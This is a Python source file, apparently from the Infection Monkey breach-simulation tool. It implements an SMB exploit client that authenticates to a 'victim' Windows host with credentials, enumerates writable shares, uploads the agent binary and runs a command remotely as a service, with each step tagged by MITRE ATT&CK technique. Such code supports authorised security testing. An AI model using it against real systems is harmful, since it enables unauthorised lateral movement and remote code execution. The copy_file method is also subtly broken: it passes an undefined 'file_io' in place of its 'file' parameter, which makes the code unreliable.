import logging

from pathlib import PurePath
from typing import List, Optional, Set, Tuple, Type

from common import OperatingSystem
from common.credentials import Credentials
from common.tags import (
    T1021_ATTACK_TECHNIQUE_TAG,
    T1105_ATTACK_TECHNIQUE_TAG,
    T1110_ATTACK_TECHNIQUE_TAG,
    T1135_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
    T1569_ATTACK_TECHNIQUE_TAG,
)
from common.types import NetworkPort
from infection_monkey.exploit.tools import (
    IRemoteAccessClient,
    RemoteAuthenticationError,
    RemoteCommandExecutionError,
    RemoteFileCopyError,
)
from infection_monkey.i_puppet import TargetHost

from .smb_client import ShareInfo, SMBClient
from .smb_options import SMBOptions

logger = logging.getLogger(__name__)

SERVICE_NAME = "InfectionMonkey"
LOGIN_TAGS = {
    T1021_ATTACK_TECHNIQUE_TAG,  # Remote Services
    T1110_ATTACK_TECHNIQUE_TAG,  # Brute Force
    T1210_ATTACK_TECHNIQUE_TAG,  # Exploitation of Remote Services
}
SHARE_DISCOVERY_TAGS = {
    T1135_ATTACK_TECHNIQUE_TAG,  # Network Share Discovery
}
COPY_FILE_TAGS = {
    T1105_ATTACK_TECHNIQUE_TAG,  # Ingress Tool Transfer
}
EXECUTION_TAGS = {
    T1021_ATTACK_TECHNIQUE_TAG,  # Remote Services
    T1210_ATTACK_TECHNIQUE_TAG,  # Exploitation of Remote Services
    T1569_ATTACK_TECHNIQUE_TAG,  # Execution: System Services
}
SMB_PORTS = [NetworkPort(139), NetworkPort(445)]


# Should this just be a variable?
class CopiedFileDetails:
    """Stores the details of a copied file"""

    def __init__(self, destination_path: PurePath):
        self.destination_path = destination_path


class SMBExploitClient(IRemoteAccessClient):
    """Manages the SMB connection, Exploitation events"""

    def __init__(
        self,
        host: TargetHost,
        options: SMBOptions,
        smb_client: SMBClient = SMBClient(),
    ):
        self._host = host
        self._options = options
        self._copied_file_details: Optional[CopiedFileDetails] = None
        self._authenticated_credentials: Optional[Credentials] = None
        self._smb_client = smb_client
        self._destination_path: Optional[PurePath] = None

    def login(self, credentials: Credentials, tags: Set[str]):
        tags.update(LOGIN_TAGS)

        try:
            self._smb_client.connect_with_user(
                self._host, credentials, timeout=self._options.smb_connect_timeout
            )
        except Exception as err:
            error_message = f"Failed to authenticate over SMB with {credentials}: {err}"
            raise RemoteAuthenticationError(error_message)

        self._authenticated_credentials = credentials

    def _raise_if_not_authenticated(self, error_type: Type[Exception]):
        if self._authenticated_credentials is None:
            raise error_type(
                "This operation cannot be performed until authentication is successful"
            )

    def get_os(self) -> OperatingSystem:
        return OperatingSystem.WINDOWS

    def execute_detached(self, command: str, tags: Set[str]):
        self._raise_if_not_authenticated(RemoteCommandExecutionError)

        try:
            tags.update(EXECUTION_TAGS)
            self._smb_client.run_service(
                SERVICE_NAME,
                command,
                self._host,
                SMB_PORTS,
                self._authenticated_credentials,
                self._options.smb_connect_timeout,
            )
        except Exception as err:
            raise RemoteCommandExecutionError(err)

    def copy_file(self, file: bytes, destination_path: PurePath, tags: Set[str]):
        self._raise_if_not_authenticated(RemoteFileCopyError)

        self._destination_path = destination_path

        logger.debug(
            f"Trying to copy monkey file to [{destination_path}] on victim {self._host.ip}"
        )

        # 1. I accept a local path
        # 2. I query for shares on the remote machine
        # 3. I check to see if the local path is a subpath of any of the shares
        #   a. If it is, I copy the file to the share
        tags.update(SHARE_DISCOVERY_TAGS)
        for share in self._query_shares():
            if share.path not in destination_path.parents:
                continue

            clean_destination = destination_path.relative_to(share.path)
            logger.debug(f"Clean destination: {clean_destination}")
            try:
                self._connect_to_share(share)
                self._smb_client.set_timeout(self._options.agent_binary_upload_timeout)

                tags.update(COPY_FILE_TAGS)
                self._smb_client.send_file(share.name, clean_destination, file_io)

                logger.info(
                    f"Copied monkey agent to remote share '{share.name}' "
                    f"[{str(share.path)}] on victim {self._host.ip}"
                )

                self._copied_file_details = CopiedFileDetails(
                    # PurePath(ntpath.join(share.path, destination_path.strip(ntpath.sep))),
                    clean_destination,
                )
                return
            except Exception as err:
                error_message = (
                    f"Error uploading monkey to share '{share.name}' "
                    f"on victim {self._host.ip}: {err}"
                )
                logger.error(error_message)

        raise RemoteFileCopyError("No writable shares found")

    def _connect_to_share(self, share: ShareInfo):
        """
        Gets the SMB share

        :param share: The share to connect to
        :raise Exception: If the share cannot be connected to
        """

        # TODO: Do we really need to handle reconnects?
        if not self._smb_client.connected():
            self._raise_if_not_authenticated(RemoteFileCopyError)
            try:
                self._smb_client.connect_with_user(
                    self._host, self._authenticated_credentials, self._options.smb_connect_timeout
                )
            except Exception as err:
                raise RemoteFileCopyError(f"Not connected: {err}")

        try:
            self._smb_client.connect_to_share(share.name)
        except Exception as err:
            logger.error(
                f'Error connecting tree to share "{str(share.path)}" '
                f"on victim {self._host.ip}: {err}"
            )
            raise RemoteFileCopyError(err)

    def get_writable_paths(self) -> List[PurePath]:
        # 1. I query for shares on the remote machine
        # 2. I output the local paths for each share
        logger.debug("Retrieving writable paths")
        return [info.path for info in self._query_shares()]

    def _query_shares(self) -> Tuple[ShareInfo, ...]:
        writable_shares = []
        for share in self._smb_client.query_shared_resources():
            if share.current_uses >= share.max_uses:
                logger.debug(
                    f"Skipping share '{share.name}' on victim "
                    f"{self._host.ip} because max uses is exceeded",
                )
                continue

            if not share.path.drive:
                logger.debug(
                    f"Skipping share '{share.name}' on victim "
                    f"{self._host.ip} because share path is invalid",
                )
                continue

            writable_shares.append(share)

        return tuple(writable_shares)
